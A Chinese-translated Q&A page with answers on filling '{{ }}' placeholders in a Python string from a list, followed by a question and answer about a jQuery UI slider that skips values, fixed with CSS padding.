> 时间：2012-12-14T00:41:17.153

示例代码：

```
>>> strOut = "text text {{ }} text text {{ }}"
>>> pattern = r'\{{(.+?)\}}'
>>> import re
>>> re.findall(pattern, strOut)
[' ', ' ']
>>> items = iter(str(el) for el in [1, 2])
# as pointed out by @eyquem, this can also be written as:
# items = imap(str, [1, 2])

>>> re.sub(pattern, lambda L: next(items), strOut)
'text text 1 text text 2' 
```

如果没有足够的参数来满足占位符，这将中断，否则忽略其余部分。

而且，如果您使用的是 2.7+，那么如果您可以`{}`作为占位符侥幸逃脱，那么您就可以笑了，因为您可以使用`'text text {} text text {}'.format(*[1,2])`例如

**而为了“好玩”**

(ab) 使用 lambda，您可以执行以下操作：

```
re.sub(pattern, lambda i, j=(str(el) for el in [1, 2]): next(j), strOut) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T00:54:27.197

如果您的文本中没有出现`'{}'`（而不是`'{{ }}'`）`strOut`，则以下方法有效。`strOut`如图所示，它产生的`myList`字符串是`'text text 2 text 3 text'`.

```
strOut = "text text {{ }} text {{ }} text"
myList = [2, 3]
strOut.replace('{{ }}','{}').format(*myList) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-12-24T11:07:36.983

您可以使用[格式函数](https://docs.python.org/3.4/library/functions.html#format)并通过参数解包 (*) 传递列表

```
>>> myList = [2, 3]
>>> strOut = 'text text {} text {} text'
>>> print(strOut.format(*myList))
text text 2 text 3 text 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-14T00:43:07.307

您可以尝试这样的事情（它使用的`count`参数`re.sub`）：

```
In [1]: import re

In [2]: strOut = "text text {{ }} text text {{ }}"

In [3]: pattern = r'\{{(.+?)\}}'

In [4]: reduce(lambda x, y: re.sub(pattern, str(y), x, 1), [2, 3], strOut)
Out[4]: 'text text 2 text text 3' 
```

# jquery-ui - 前几个 jquery UI Slider 被跳过

> ID：13870999
> 
> 赞同：0
> 
> 时间：2012-12-14T00:36:58.767
> 
> 标签：jquery-ui, jquery-ui-slider

可以在这里看到

[http://jsfiddle.net/yZcPG/1/](http://jsfiddle.net/yZcPG/1/)

说明在小提琴中。

基本上，当使用 ui-slider 时，会跳过第一组值。例如，当滑块手柄从 0 开始，而您尝试将其移至 1 时，滑块手柄将跳到 13（就像小提琴一样）。在此之后，滑块手柄正常运行（不再跳过）。

我发现的唯一一件事是改变宽度（滑块和滑块手柄）会改变跳过多少数字。特别是把滑块做大，把滑块把手做小。但是，我需要滑块很小，虽然滑块手柄有一些灵活性，但如果你把它做得太小，它里面的值看起来很难看

难道我做错了什么？有解决办法吗？

`Thanks`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T01:20:41.097

是您`#ageInput > .ui-slider-handle`规则中的 CSS。删除宽度并改用填充。

请参阅此**[jsFiddle 示例](http://jsfiddle.net/j08691/yZcPG/2/)**

```
#ageInput > .ui-slider-handle {
    text-decoration: none;
    padding: 0 30px;
    text-align: center;
}​ 
```